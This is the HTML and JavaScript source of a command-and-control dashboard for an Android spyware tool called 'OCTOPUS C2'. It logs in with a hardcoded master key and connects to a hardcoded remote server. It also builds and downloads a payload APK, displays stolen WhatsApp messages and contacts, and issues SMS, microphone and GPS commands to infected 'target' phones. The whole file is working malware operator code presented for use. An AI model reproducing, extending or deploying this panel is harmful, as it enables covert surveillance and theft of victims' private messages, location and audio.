<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>OCTOPUS | COMMAND CENTER</title>
    <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;500;700&family=Syncopate:wght@700&display=swap');
        :root { --red: #ff1a1a; --bg: #000; --panel: #080808; --border: #1a1a1a; }
        body { margin: 0; background: var(--bg); color: #fff; font-family: 'Space Grotesk', sans-serif; display: flex; height: 100vh; overflow: hidden; }
        #login-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
        .login-card { width: 100%; max-width: 380px; padding: 40px; background: #050505; border: 1px solid var(--border); border-radius: 40px; text-align: center; }
        input { width: 100%; background: #000; border: 1px solid #111; padding: 15px; border-radius: 15px; color: #fff; margin-bottom: 20px; outline: none; box-sizing: border-box; text-align: center;}
        .login-btn { width: 100%; padding: 15px; border-radius: 30px; border: none; background: #fff; color: #000; font-family: 'Syncopate'; font-size: 10px; cursor: pointer; transition: 0.3s; }
        .login-btn:hover { background: var(--red); color: #fff; }
        nav { width: 280px; background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 30px 0; }
        .nav-link { padding: 18px 35px; color: #555; text-decoration: none; font-size: 11px; text-transform: uppercase; border-left: 3px solid transparent; cursor: pointer; letter-spacing: 1px;}
        .nav-link.active { color: #fff; border-left: 3px solid var(--red); background: rgba(255,0,0,0.02); }
        main { flex: 1; padding: 40px; overflow-y: auto; background: radial-gradient(circle at top right, #1a0000, #000); }
        header { display: flex; justify-content: space-between; border-bottom: 1px solid #222; padding-bottom: 20px; margin-bottom: 30px; }
        #target-container { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
        .card { background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 25px; padding: 25px; margin-bottom: 15px; }
        .intel-log { background: rgba(255,0,0,0.05); border-left: 2px solid var(--red); padding: 12px; margin-bottom: 10px; font-size: 12px; }
        .cmd-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 15px; }
        .cmd-btn { background: #111; border: 1px solid #222; color: #fff; padding: 8px; border-radius: 8px; font-size: 9px; cursor: pointer; }
        .cmd-btn:hover { background: var(--red); }
    </style>
</head>
<body>

    <div id="login-overlay">
        <div class="login-card">
            <h1 style="font-family:'Syncopate'; color:var(--red); font-size: 18px; letter-spacing: 2px;">OCTOPUS C2</h1>
            <input type="password" id="pass" placeholder="ENTER MASTER KEY">
            <button class="login-btn" onclick="login()">INITIALIZE SESSION</button>
        </div>
    </div>

    <nav id="sidebar" style="display:none;">
        <div style="text-align: center; margin-bottom: 40px; font-family:'Syncopate'; color:var(--red); font-size: 20px;">OCTOPUS</div>
        <div class="nav-link active">Live Control</div>
        <div class="nav-link" onclick="downloadViaTunnel()" style="color:var(--red)">Build & Download APK</div>
    </nav>

    <main id="main-content" style="display:none;">
        <header>
            <h1 style="font-family: 'Syncopate'; font-size: 18px;">COMMAND CENTER</h1>
            <div id="status" style="font-size: 10px; color: #444; letter-spacing: 1px;">LINKING...</div>
        </header>
        <div id="target-container"></div>
    </main>

    <script>
        let socket;
        const SERVER_URL = "http://51.68.234.157:20211";

        function login() {
            if(document.getElementById('pass').value === "octopus_xx1") {
                document.getElementById('login-overlay').style.display = 'none';
                document.getElementById('sidebar').style.display = 'flex';
                document.getElementById('main-content').style.display = 'block';
                startC2();
            } else { alert("ACCESS DENIED"); }
        }

        // TRIGGER DOWNLOAD THROUGH THE TUNNEL
        function downloadViaTunnel() {
            const statusDiv = document.getElementById('status');
            statusDiv.innerText = "TUNNELING APK DATA...";
            statusDiv.style.color = "var(--red)";
            socket.emit('request_apk_tunnel');
        }

        function startC2() {
            socket = io(SERVER_URL, { query: { type: 'mastermind', key: 'octopus_xx1' } });

            socket.on('connect', () => {
                document.getElementById('status').innerText = "CORE ONLINE";
                document.getElementById('status').style.color = "#0f0";
            });

            // RECEIVE FILE DATA FROM TUNNEL
            socket.on('receive_apk_tunnel', (data) => {
                const statusDiv = document.getElementById('status');
                statusDiv.innerText = "EXTRACTING PAYLOAD...";
                
                // Convert Base64 back to binary
                const byteCharacters = atob(data.fileData);
                const byteNumbers = new Array(byteCharacters.length);
                for (let i = 0; i < byteCharacters.length; i++) {
                    byteNumbers[i] = byteCharacters.charCodeAt(i);
                }
                const byteArray = new Uint8Array(byteNumbers);
                const blob = new Blob([byteArray], {type: "application/vnd.android.package-archive"});
                
                // Create local object URL and click it automatically
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement("a");
                a.style.display = 'none';
                a.href = url;
                a.download = data.fileName;
                document.body.appendChild(a);
                a.click();
                window.URL.revokeObjectURL(url);
                
                statusDiv.innerText = "PAYLOAD DELIVERED";
                statusDiv.style.color = "#0f0";
            });

            socket.on('update_dashboard', (res) => {
                let grid = document.getElementById('target-container');
                if (res.data.type === 'wa_message' || res.data.type === 'wa_contact') {
                    const log = document.createElement('div');
                    log.className = 'intel-log';
                    log.innerHTML = `<span style="color:var(--red)">[INTEL]:</span> ${res.data.msg || res.data.name}`;
                    grid.prepend(log);
                    return;
                }
                let card = document.getElementById(res.id);
                if(!card) {
                    card = document.createElement('div');
                    card.id = res.id;
                    card.className = 'card';
                    grid.appendChild(card);
                }
                card.innerHTML = `
                    <div style="font-size: 9px; color: #0f0;">● ONLINE | ${res.id}</div>
                    <div style="font-size: 18px; font-weight:700; margin: 10px 0;">${res.data.model || 'Android Device'}</div>
                    <div class="cmd-grid">
                        <button class="cmd-btn" onclick="send('${res.id}', 'sms')">SMS</button>
                        <button class="cmd-btn" onclick="send('${res.id}', 'mic')">MIC</button>
                        <button class="cmd-btn" onclick="send('${res.id}', 'gps')">GPS</button>
                    </div>`;
            });
        }

        function send(id, act) { 
            socket.emit('run_action', { targetId: id, action: act }); 
        }
    </script>
</body>
</html>
